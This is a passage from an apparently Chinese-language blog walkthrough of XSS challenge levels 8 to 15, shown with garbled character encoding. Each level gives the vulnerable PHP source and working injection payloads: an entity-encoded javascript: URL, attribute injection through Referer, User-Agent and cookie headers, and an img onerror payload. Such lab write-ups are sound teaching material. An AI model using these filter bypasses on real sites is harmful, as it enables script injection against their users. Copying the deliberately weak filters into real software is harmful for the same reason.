src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558106118797.png" alt="1558106118797"></p><p>scriptå’Œhrefè¢«æ›¿æ¢ï¼Œå†å°è¯•onã€srcã€<code>&quot;</code> éƒ½ä¼šè¢«æ›¿æ¢ï¼Œå¤§å°å†™ä¹Ÿæ— æ³•ç»•è¿‡</p><p>çœ‹ä¸€ä¸‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>ç¬¬ä¸€å¤„æœ‰htmlå®ä½“åŒ–è½¬ä¹‰ï¼Œæ— æ³•é€ƒè„±å‡ºæ¥ã€‚ç¬¬äºŒå¤„å…ˆè½¬æ¢å¤§å°å†™ï¼Œç„¶åé»‘åå•è¿‡æ»¤ç‰¹æ®Šå­—ç¬¦å’ŒåŒå¼•å·ï¼›å‚è€ƒåˆ«äººçš„æ–‡ç« ï¼Œå‘ç°å¯ä»¥å¯¹HTMLå±æ€§çš„å€¼è¿›è¡Œå®ä½“ç¼–ç ç»•è¿‡</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(/xss/)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558237810579.png" alt="1558237810579"></p><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><h3 id="æ ¼å¼éªŒè¯ç»•è¿‡"><a href="#æ ¼å¼éªŒè¯ç»•è¿‡" class="headerlink" title="æ ¼å¼éªŒè¯ç»•è¿‡"></a>æ ¼å¼éªŒè¯ç»•è¿‡</h3><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558248807926.png" alt="1558248807926"></p><p>æç¤ºé“¾æ¥ä¸åˆæ³•ï¼Œåº”è¯¥æ˜¯éªŒè¯äº†é“¾æ¥çš„æ ¼å¼ï¼Œè¾“å…¥<code>http://</code> èƒ½æˆåŠŸå†™å…¥</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558248919987.png" alt="1558248919987"></p><p>é‚£å°±ç»§ç»­æ„é€ å¸¦ <code>http://</code> çš„æ‹¼æ¥è¯­å¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(/xss/)//http://</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558249256987.png" alt="1558249256987"></p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>===strpos($str7,<span class="string">'http://'</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼"&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>å¯ä»¥çœ‹å‡ºä¸level8çš„åŒºåˆ«å°±åœ¨äºå¤šåŠ äº†ä¸€ä¸ªé“¾æ¥æ ¼å¼çš„åˆ¤æ–­ï¼Œä½¿ç”¨strpos()å‡½æ•°ï¼ŒæŸ¥æ‰¾<code>http://</code>å‡ºç°çš„ä½ç½®ï¼Œä½†æ˜¯æ”¹ä»£ç æ²¡æœ‰åˆ¤æ–­ä½ç½®æ˜¯å¦åœ¨å¼€å¤´ï¼Œä»…åˆ¤æ–­è¢«æŸ¥æ‰¾çš„å­—ç¬¦ä¸²å³ <code>http://</code> æ˜¯å¦å­˜åœ¨ï¼Œæ‰€ä»¥å¯ä»¥åœ¨payloadåé¢åŠ ä¸Šæ³¨é‡Šç¬¦å’Œ<code>http://</code>ï¼Œå³å¯æˆåŠŸç»•è¿‡</p><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><h3 id="éšè—GETä¼ å‚"><a href="#éšè—GETä¼ å‚" class="headerlink" title="éšè—GETä¼ å‚"></a>éšè—GETä¼ å‚</h3><p>è¿™å…³å‘ç°ä¸€ä¸ªéšè—çš„è¡¨å•</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558250497766.png" alt="1558250497766"></p><p>ä½†æ˜¯æ²¡æœ‰æäº¤æŒ‰é’®å’Œæäº¤é¡µé¢</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558250601339.png" alt="1558250601339"></p><p>çœ‹ä¸€ä¸‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str11 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>å‘ç°GETå‚æ•°<code>t_sort</code>ä¼šè¢«è¿‡æ»¤<code>&lt;&gt;</code>è¾“å‡ºï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨äº‹ä»¶å±æ€§è¿›è¡Œæ„é€ åˆ©ç”¨</p><p>payloadå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558251116826.png" alt="1558251116826"></p><h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><h3 id="Refererå¤´æ’å…¥"><a href="#Refererå¤´æ’å…¥" class="headerlink" title="Refererå¤´æ’å…¥"></a>Refererå¤´æ’å…¥</h3><p>éšè—è¡¨å•å¤šäº†ä¸€ä¸ª<code>&lt;input&gt;</code></p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558251262671.png" alt="1558251262671"></p><p>æŠŠå…¨éƒ¨è¡¨å•çš„å€¼é€šè¿‡GETå‚æ•°ä¼ é€’è¿‡å»</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558251563250.png" alt="1558251563250"></p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558251601685.png" alt="1558251601685"></p><p>åªæœ‰t_sortæ¥æ”¶äº†getä¼ å‚ï¼Œçœ‹èµ·æ¥åŒå¼•å·è¢«è½¬ä¹‰æ‰äº†ï¼Œå°è¯•äº†å•å¼•å·ä¹Ÿä¸è¡Œï¼Œåˆå°è¯•äº†POSTä¼ å‚ä¹Ÿä¸è¡Œ</p><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ref"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>å’Œä¸Šä¸€å…³çš„ä»£ç ç±»ä¼¼ï¼Œä½†æ˜¯<code>t_sort</code>çš„å€¼ç»è¿‡äº†htmlå®ä½“åŒ–è½¬ä¹‰ï¼Œæ‰€ä»¥æ— æ³•åœ¨æ­¤å¤„è¿›è¡Œåˆ©ç”¨äº†ã€‚ä¸è¿‡æ–°çš„<code>t_ref</code>ï¼Œçš„å€¼æ˜¯é€šè¿‡refererå¤´è·å–çš„ï¼Œå¯ä»¥æŠ“åŒ…ä¿®æ”¹Refererå¤´çš„å†…å®¹ï¼Œæ’å…¥payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558252521803.png" alt="1558252521803"></p><p>æ€»ç»“ï¼š</p><p>è¦æ³¨æ„ç»†èŠ‚ï¼Œå¯»æ‰¾æç¤ºä¿¡æ¯ï¼Œä¸æ”¾è¿‡ä»»ä½•ä¸€å¤„æˆ‘ä»¬æäº¤çš„æ•°æ®å†…å®¹</p><h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><h3 id="UAå¤´æ’å…¥"><a href="#UAå¤´æ’å…¥" class="headerlink" title="UAå¤´æ’å…¥"></a>UAå¤´æ’å…¥</h3><p>åœ¨é¡µé¢æºç ä¸­å‘ç°User-Agentä¿¡æ¯</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558252884442.png" alt="1558252884442"></p><p>ä¿®æ”¹UAå¤´éƒ¨ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: 1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558253045262.png" alt="1558253045262"></p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558253074469.png" alt="1558253074469"></p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ua"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>è·Ÿä¸Šä¸€å…³ä¸€æ ·ï¼ŒåŒºåˆ«å°±åœ¨äºè·å–çš„è¯·æ±‚å¤´éƒ¨ä¿¡æ¯å˜æˆäº†<code>User-Agent</code>ï¼Œæ‰€ä»¥åªéœ€è¦æŠ“åŒ…ä¿®æ”¹UAçš„å†…å®¹å³å¯</p><h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><h3 id="Cookieæ’å…¥"><a href="#Cookieæ’å…¥" class="headerlink" title="Cookieæ’å…¥"></a>Cookieæ’å…¥</h3><p>æ³¨æ„åˆ°cookieå‚æ•°</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558253383778.png" alt="1558253383778"></p><p>æŸ¥çœ‹cookieå†…å®¹</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558253574394.png" alt="1558253574394"></p><p>ä¿®æ”¹cookieï¼Œæ’å…¥payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558253654942.png" alt="1558253654942"></p><p>æˆåŠŸè§¦å‘XSS</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">setcookie(<span class="string">"user"</span>, <span class="string">"call me maybe?"</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_COOKIE[<span class="string">"user"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_cook"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>è·Ÿä¹‹å‰ä¸€æ ·ï¼ŒåŒºåˆ«å°±åœ¨äºè·å–çš„è¯·æ±‚å¤´éƒ¨ä¿¡æ¯æ¢æˆäº†è·å–cookieä¸­çš„<code>user</code>çš„å€¼ï¼Œæ‰€ä»¥æŠŠcookieä¸­userçš„å€¼é‡Œæ’å…¥payloadå³å¯</p><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><h3 id="exif-xss"><a href="#exif-xss" class="headerlink" title="exif xss"></a>exif xss</h3><p>è¿™å…³ä½¿ç”¨<code>&lt;iframe&gt;</code>åµŒå…¥äº†ä¸€ä¸ªå°ç½‘é¡µï¼ˆæ³¨æ„ï¼šéœ€è¦è®¿é—®åˆ°<code>å¤–ç½‘</code>æ‰èƒ½è®¿é—®ï¼‰</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558254716646.png" alt="1558254716646"></p><p>å‘ç°æœç´¢æ¡†æœ‰è¾“å‡ºç‚¹</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558254944255.png" alt="1558254944255"></p><p>å°è¯•é—­åˆæ ‡ç­¾</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558255107617.png" alt="1558255107617"></p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558255149283.png" alt="1558255149283"></p><p>&lt;&gt;è¢«è½¬ä¹‰æ‰äº†ï¼Œæ„Ÿè§‰è¿™é‡Œä¸å­˜åœ¨å¯åˆ©ç”¨çš„ç‚¹äº†ã€‚</p><p>çœ‹ä¸‹æºç ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"leftframe"</span> <span class="attr">marginwidth</span>=<span class="string">10</span> <span class="attr">marginheight</span>=<span class="string">10</span> <span class="attr">src</span>=<span class="string">"http://www.exifviewer.org/"</span> <span class="attr">frameborder</span>=<span class="string">no</span> <span class="attr">width</span>=<span class="string">"80%"</span> <span class="attr">scrolling</span>=<span class="string">"no"</span> <span class="attr">height</span>=<span class="string">80%</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>è¿™å…³æˆåŠŸåä¸ä¼šè‡ªåŠ¨è·³è½¬ã€‚æˆåŠŸè€…<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">/xsschallenge/level15.php?src</span>=<span class="string">1.gif</span>&gt;</span>ç‚¹æˆ‘è¿›level15<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åªæœ‰ä¸€ä¸ªiframeæ ‡ç­¾å¼•ç”¨äº†<a href="http://exofvoewer.org/" target="_blank" rel="noopener">http://exofvoewer.org</a>ï¼Œæœ€åçœ‹äº†ä¸‹<a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12" target="_blank" rel="noopener">å…ˆçŸ¥ä¸Šçš„wp</a>ï¼Œäº†è§£åˆ°è¿™å…³è€ƒå¯Ÿçš„æ˜¯exif xssï¼Œæ¼æ´åŸç†æ˜¯é€šè¿‡ä¿®æ”¹å›¾ç‰‡çš„exifä¿¡æ¯ï¼Œé€ æˆè§£æå›¾ç‰‡exifè§¦å‘XSSã€‚</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558360067701.png" alt="1558360067701"></p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; &quot;&gt;&lt;img src=x onerror=alert(1)&gt;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558358694058.png" alt="1558358694058"></p><h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><h3 id="æ–‡ä»¶åŒ…å«æ’å…¥"><a href="#æ–‡ä»¶åŒ…å«æ’å…¥" class="headerlink" title="æ–‡ä»¶åŒ…å«æ’å…¥"></a>æ–‡ä»¶åŒ…å«æ’å…¥</h3><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558265228176.png" alt="1558265228176"></p><p>å…ˆè¯•äº†ä¸€ä¸‹é—­åˆæ ‡ç­¾</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558266783744.png" alt="1558266783744"></p><p><code>&lt;&gt;</code>è¢«è½¬ä¹‰æ‰äº†ï¼Œå†è¯•ä¸€ä¸‹äº‹ä»¶å±æ€§</p><p><img src="/2019/05/20/XSSæŒ‘æˆ˜ä¹‹æ—…/XSSæŒ‘æˆ˜ä¹‹æ—….assets/1558266984431.png" alt="1558266984431"></p><p>åŒå¼•å·ä¹Ÿè¢«è½¬ä¹‰æ‰äº†ï¼Œä¸€æ—¶æ²¡äº†æ€è·¯ï¼Œçœ‹äº†ä¸‹ç½‘ä¸Šçš„æ–‡ç« 